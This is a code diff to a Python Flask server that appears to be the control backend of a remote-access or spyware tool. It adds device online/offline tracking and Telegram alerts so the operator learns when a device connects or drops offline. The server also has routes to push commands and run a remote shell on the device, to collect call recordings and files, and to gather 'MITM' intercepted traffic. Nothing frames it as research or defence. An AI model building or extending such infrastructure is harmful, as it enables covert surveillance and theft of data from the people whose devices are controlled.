@@ -21,17 +21,17 @@ users = {
     "default_user": {"password": hashlib.sha256(b"user123").hexdigest()}
 }
 commands, results, shell_sessions = {}, {}, {}
+last_seen_status = {}
 
-# === Telegram Notification Config ===
+# === Telegram Notification ===
 TELEGRAM_API = "https://api.telegram.org"
 
 def hash_password(p): return hashlib.sha256(p.encode()).hexdigest()
 def now(): return datetime.datetime.utcnow().isoformat()
 def allowed(f): return '.' in f and f.rsplit('.', 1)[1].lower() in {'jpg','png','mp4','mp3','txt','zip','wav','json','apk'}
 
-def notify_telegram(bot_token, chat_id, device_id):
+def notify_telegram(bot_token, chat_id, text):
     url = f"{TELEGRAM_API}/bot{bot_token}/sendMessage"
-    text = f"✅ New device connected: `{device_id}`"
     return requests.post(url, json={
         "chat_id": chat_id,
         "text": text,
@@ -43,7 +43,6 @@ def notify_telegram(bot_token, chat_id, device_id):
 def login():
     d = request.json
     provided_password = d.get("password")
-
     for username, info in users.items():
         if info["password"] == provided_password:
             return jsonify({
@@ -51,7 +50,6 @@ def login():
                 "role": "admin" if username == "admin" else "user",
                 "default": username == "default_user"
             })
-
     return jsonify({"error": "unauthorized"}), 403
 
 # === Device Registration ===
@@ -63,16 +61,19 @@ def register_device():
     bot_token = d.get('bot_token')
     chat_id = d.get('chat_id')
 
-    devices[device_id] = {
+    device_info = {
         "owner_token": owner_token,
         "last_seen": now(),
         "bot_token": bot_token,
-        "chat_id": chat_id
+        "chat_id": chat_id,
+        "online": True
     }
 
-    # Notify Telegram if possible
-    if bot_token and chat_id:
-        notify_telegram(bot_token, chat_id, device_id)
+    previously_online = devices.get(device_id, {}).get("online", False)
+    devices[device_id] = device_info
+
+    if bot_token and chat_id and not previously_online:
+        notify_telegram(bot_token, chat_id, f"✅ Device connected: `{device_id}`")
 
     return jsonify(status='registered')
 
@@ -81,10 +82,35 @@ def heartbeat():
     did = request.json.get('device_id')
     if did in devices:
         devices[did]['last_seen'] = now()
+        devices[did]['online'] = True
         return jsonify(status='ok')
     return jsonify(status='unknown_device'), 404
 
-# === Commands & Shell ===
+@app.route('/check_device_online/<device_id>', methods=['GET'])
+def check_device_online(device_id):
+    device = devices.get(device_id)
+    if not device:
+        return jsonify(status="not_found"), 404
+    return jsonify(online=device.get("online", False))
+
+# === Offline Monitoring ===
+@app.before_request
+def check_device_timeout():
+    timeout_seconds = 60
+    now_time = datetime.datetime.utcnow()
+    for device_id, info in list(devices.items()):
+        try:
+            last = datetime.datetime.fromisoformat(info['last_seen'])
+            if (now_time - last).total_seconds() > timeout_seconds:
+                if info.get("online"):
+                    devices[device_id]["online"] = False
+                    if info.get("bot_token") and info.get("chat_id"):
+                        notify_telegram(info["bot_token"], info["chat_id"],
+                                        f"⚠️ Device went offline: `{device_id}`")
+        except:
+            continue
+
+# === Commands ===
 @app.route('/send_command', methods=['POST'])
 def send_command():
     d = request.json
@@ -103,10 +129,7 @@ def command_result():
     results.setdefault(d['device_id'], []).append({"result": d['result'], "time": now()})
     return jsonify(status='logged')
 
-@app.route('/get_results/<device_id>', methods=['GET'])
-def get_results(device_id):
-    return jsonify(results=results.get(device_id, []))
-
+# === Shell ===
 @app.route('/start_shell/<device_id>', methods=['POST'])
 def start_shell(device_id):
     shell_sessions[device_id] = {"active": True, "history": []}
@@ -127,7 +150,7 @@ def shell_command(device_id):
         return jsonify(status="received")
     return jsonify(status="inactive"), 400
 
-# === File Uploads & Navigation ===
+# === File Handling ===
 @app.route('/upload_file/<device_id>', methods=['POST'])
 def upload_file(device_id):
     f = request.files.get('file')
@@ -172,7 +195,7 @@ def list_call_recordings(device_id):
 def download_call_recording(device_id, filename):
     return send_from_directory(os.path.join(CALLS, device_id), filename, as_attachment=True)
 
-# === MITM Data ===
+# === MITM ===
 @app.route('/upload_mitm_data/<device_id>', methods=['POST'])
 def upload_mitm_data(device_id):
     f = request.files.get("file")
@@ -192,7 +215,7 @@ def list_mitm_data(device_id):
 def download_mitm_data(device_id, filename):
     return send_from_directory(os.path.join(MITM, device_id), filename, as_attachment=True)
 
-# === Admin Controls ===
+# === Admin ===
 @app.route('/get_users', methods=['GET'])
 def get_users():
     return jsonify(users=list(users.keys()))
@@ -200,7 +223,7 @@ def get_users():
 @app.route('/admin/devices/<user_token>', methods=['GET'])
 def admin_devices(user_token):
     found = [
-        {"device_id": d, "last_seen": devices[d]["last_seen"]}
+        {"device_id": d, "last_seen": devices[d]["last_seen"], "online": devices[d].get("online", False)}
         for d in devices if devices[d]["owner_token"] == user_token
     ]
     return jsonify(devices=found)
@@ -214,6 +237,6 @@ def change_password():
         return jsonify(status='updated', confirm=True)
     return jsonify(status='not_found'), 404
 
-# === Run ===
+# === Run Server ===
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
